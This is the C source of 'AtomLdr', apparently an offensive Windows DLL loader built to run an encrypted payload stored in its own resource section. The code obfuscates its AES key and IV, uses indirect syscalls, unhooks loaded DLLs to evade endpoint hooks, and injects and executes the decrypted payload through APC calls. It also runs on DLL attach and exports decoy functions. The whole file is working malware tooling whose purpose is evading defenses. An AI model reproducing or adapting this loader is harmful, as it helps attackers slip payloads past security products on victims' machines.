#include <Windows.h>
#include <shlobj.h>

#include "Structs.h"
#include "Common.h"
#include "HellsHall.h"
#include "Resource.h"
#include "ctaes.h"
#include "Debug.h"

#pragma comment (lib, "shell32.lib")

// comment to disable unhooking (not advised) - use for debugging purposes only
//
#define UNHOOK


// 'win32u.dll' contains the ROPs to jump to later 
HRESULT AddWin32uToIat() {

    // 'SHGetFolderPathW' is exported from 'shell32.dll', that will load 'win32u.dll' 
    // so, instead of loading 'win32u.dll' directly, we simply use one of shell32.dll's APIs
    // forcing 'win32u.dll' to be loaded without the need of calling 'LoadLibrary' or 'LdrLoadDll'
    // other dlls that will load 'win32u.dll', are 'ole32.dll' and 'comctl32.dll'

    WCHAR szPath[MAX_PATH] = { 0 };
    return SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}

/*
	fetch payload from the resource section manually
*/
BOOL GetResourceData(HMODULE hModule, WORD ResourceId, PVOID* ppResourceRawData, PDWORD psResourceDataSize) {

	CHAR* pBaseAddr = (CHAR*)hModule;
	PIMAGE_DOS_HEADER 	pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;
	PIMAGE_NT_HEADERS 	pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
	PIMAGE_OPTIONAL_HEADER 	pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;
	PIMAGE_DATA_DIRECTORY 	pDataDir = (PIMAGE_DATA_DIRECTORY)&pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PIMAGE_RESOURCE_DIRECTORY 	pResourceDir = NULL, pResourceDir2 = NULL, pResourceDir3 = NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = NULL, pResourceEntry2 = NULL, pResourceEntry3 = NULL;

	PIMAGE_RESOURCE_DATA_ENTRY 	pResource = NULL;


	pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
	pResourceEntry = (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);


	for (size_t i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

		if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {

			pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);

			pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));

			*ppResourceRawData = (PVOID)(pBaseAddr + (pResource->OffsetToData));
			*psResourceDataSize = pResource->Size;

			break;
		}

	}

	if (*ppResourceRawData != NULL && *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}

/*
	function to decrypt the aes key and iv
*/
VOID FetchAesKetAndIv(IN OUT PBYTE ctAesKey, IN OUT PBYTE ctAesIv) {

	for (int i = 0; i < IV_SIZE; i++) {
		ctAesIv[i] -= 0x03;
	}
	for (int i = 0; i < KEY_SIZE; i++) {
		ctAesKey[i] -= 0x03;
	}
	for (int i = 0; i < IV_SIZE; i++) {
		ctAesIv[i] ^= (BYTE)ctAesKey[0];
	}
	for (int i = 1; i < KEY_SIZE; i++) {
		for (int j = 0; j < IV_SIZE; j++) {
			ctAesKey[i] ^= (BYTE)ctAesIv[j];
		}
	}
}


/*
	function used to brute force AtomLdr.dll's handle
*/
HMODULE hGetCurrentModuleHandle(PVOID pLocalFunction) {

	ULONG_PTR			uFunctionPntr	= (ULONG_PTR)pLocalFunction;
	PIMAGE_DOS_HEADER	pImgDosHdr		= NULL;
	PIMAGE_NT_HEADERS	pImgNtHdrs		= NULL;
	
	do {
		pImgDosHdr = (PIMAGE_DOS_HEADER)uFunctionPntr;

		if ((pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE)) 
		{
			pImgNtHdrs = (PIMAGE_NT_HEADERS)(uFunctionPntr + pImgDosHdr->e_lfanew);
			if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE && (pImgNtHdrs->OptionalHeader.Magic & IMAGE_NT_OPTIONAL_HDR64_MAGIC))
				return (HMODULE)uFunctionPntr;
		}

		uFunctionPntr--;

	} while (1);

	return NULL;
}



/*
	function that contains the real loader logic
*/
int ActualMain() {

	PVOID			pResourceRawData		= NULL;
	DWORD			dwResourceDataSize		= NULL,
					dwptPayloadSize			= NULL;
	PVOID			ctPayload				= NULL,
					ptPayload				= NULL,
					pAddress				= NULL;
	HMODULE			hModule					= NULL;
	BYTE			ctAesKey[KEY_SIZE]		= { 0 };
	BYTE			ctAesIv[IV_SIZE]		= { 0 };
	AES256_CBC_ctx	CtAesCtx				= { 0 };

	// make sure 'win32u.dll' is loaded
	AddWin32uToIat();


	// get the 'AtomLdr.dll' dll handle
	if ((hModule = hGetCurrentModuleHandle(&ActualMain)) == NULL) {	
#ifdef DEBUG
		PRINTA("[!] hGetCurrentModuleHandle To Fetch AtomLdr.dll Handle (main.c:151)\n");
#endif // DEBUG
		goto _EndOfFunction;
	}

	if (!GetResourceData(hModule, ATOMLDR_PAYLOAD, &pResourceRawData, &dwResourceDataSize)) {
#ifdef DEBUG
		PRINTA("[!] GetResourceData Failed To Fetch Resource Section Payload Of Id 0x%0.8X From Module 0x%p (main.c:158)\n", ATOMLDR_PAYLOAD, hModule);
#endif // DEBUG
		goto _EndOfFunction;
	}

	ctPayload = (PVOID)((ULONG_PTR)pResourceRawData + KEY_SIZE + IV_SIZE);
	dwptPayloadSize = dwResourceDataSize - (KEY_SIZE + IV_SIZE);

#ifdef DEBUG
	PRINTA("[+] Payload Is At 0x%p Of Size %d \n", ctPayload, dwptPayloadSize);
#endif // DEBUG

	// get the aes key & iv from the resource section
	_memcpy(ctAesKey, pResourceRawData, KEY_SIZE);
	_memcpy(ctAesIv, (PVOID)((ULONG_PTR)pResourceRawData + KEY_SIZE), IV_SIZE);

	// initialize indirect syscalls
	if (!IntizlizeIndirectSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] IntizlizeIndirectSyscalls Failed (main.c:177)\n");
#endif // DEBUG
		goto _EndOfFunction;
	}

	// fetch other syscalls/winapi with GetProcAddressH and GetModuleHandleH
	if (!InitializeDirectCalls()) {
#ifdef DEBUG
		PRINTA("[!] InitializeDirectCalls Failed (main.c:185)\n");
#endif // DEBUG
		goto _EndOfFunction;
	}

	// unhook dlls from local process
#ifdef UNHOOK
	if (!RefreshAllDlls()) {
#ifdef DEBUG
		PRINTA("[!] RefreshAllDlls Failed (main.c:194)\n");
#endif // DEBUG
		goto _EndOfFunction;
	}
#endif // UNHOOK

	// decrypt the key and iv
	FetchAesKetAndIv(ctAesKey, ctAesIv);

#ifdef DEBUG
	PRINTA(">>> The Decrypted Key Bytes: [ ");
	for (size_t i = 0; i < KEY_SIZE; i++)
		PRINTA("%02X ", ctAesKey[i]);
	PRINTA("]\n");

	PRINTA(">>> The Decrypted Iv Bytes: [ ");
	for (size_t i = 0; i < IV_SIZE; i++)
		PRINTA("%02X ", ctAesIv[i]);
	PRINTA("]\n");
#endif // DEBUG

	// AES payload decryption 
	AES256_CBC_init(&CtAesCtx, ctAesKey, ctAesIv);
	if (!AES256_CBC_decrypt(&CtAesCtx, ctPayload, dwptPayloadSize, &ptPayload)) {
#ifdef DEBUG
		PRINTA("[!] AES256_CBC_decrypt Failed (main.c:219)\n");
#endif // DEBUG
		goto _EndOfFunction;
	}

#ifdef DEBUG
	PRINTA("[+] Decrypted Payload At : 0x%p \n", ptPayload);
#endif // DEBUG

	// write the payload
	if (!NtApcWrite(ptPayload, dwptPayloadSize, &pAddress)) {
#ifdef DEBUG
		PRINTA("[!] NtApcWrite Failed (main.c:231)\n");
#endif // DEBUG
		goto _EndOfFunction;
	}

	// free the decrypted payload (allocated by 'AES256_CBC_decrypt')
	HeapFree(GetProcessHeap(), 0, ptPayload);

#ifdef DEBUG
	MessageBoxA(NULL, "Payload Will Be Executed", "AtomLdr", MB_OK | MB_ICONEXCLAMATION);
#endif // DEBUG

	// running payload
	if (!RunViaNtApc(pAddress)) {
#ifdef DEBUG
		PRINTA("[!] RunViaNtApc Failed (main.c:246)\n");
#endif // DEBUG
		goto _EndOfFunction;
	}


_EndOfFunction:
#ifdef DEBUG
	switch (MessageBoxA(NULL, "Free Debug Console ?", "AtomLdr", MB_OKCANCEL | MB_ICONQUESTION)) {
		case IDOK: {
			FreeConsole();
			break;
		}
		default: {
			break;
		}
	}
#endif // DEBUG

	return 0;
}


/*
	AtomLdr.dll's entry point
*/
BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){

    switch (dwReason){
		case DLL_PROCESS_ATTACH: {

			BOOL    _Atom = FALSE;
			int     _argc = 0;
			LPWSTR* _argv = CommandLineToArgvW(GetCommandLineW(), &_argc);
			for (int i = 0; i < _argc; i++) {
				if (HASHb(_argv[i]) == Atom_CRC32b) {
					_Atom = TRUE;
					break;
				}
			}
			if (!_Atom) {
#ifdef DEBUG
				PRINTA("[#] AtomLdr.dll Is Loaded Into A Process, Running \"ActualMain\" From DllMain \n");
#endif // DEBUG

				if (!CreateThread(NULL, NULL, ActualMain, NULL, NULL, NULL)) {
#ifdef DEBUG
					MessageBoxA(NULL, "Failed Running CreateThread WinAPI (main.c:293)", "AtomLdr", MB_OK | MB_ICONERROR);
#endif // DEBUG
					return FALSE;
				}
			}

			break;
		}
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}


// the exported function 'Atom' to be called from the command line
__declspec(dllexport) int Atom() {
#ifdef DEBUG
	PRINTA("[#] AtomLdr.dll Is Called Via Command Line Tool, Running \"ActualMain\" From The Exported Function \"Atom\" \n");
#endif // DEBUG

	return ActualMain();
}


// the following are dummy exported functions
__declspec(dllexport) int AtomSystemInstaller() {
	return 0;
}

__declspec(dllexport) int AtomHelper() {
	return 0;
}

__declspec(dllexport) int InitializeAtomSystem() {
	return 0;
}

//       REPLACING MEMSET
extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
	unsigned char* p = (unsigned char*)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (unsigned char)value;
	}
	return pTarget;
}
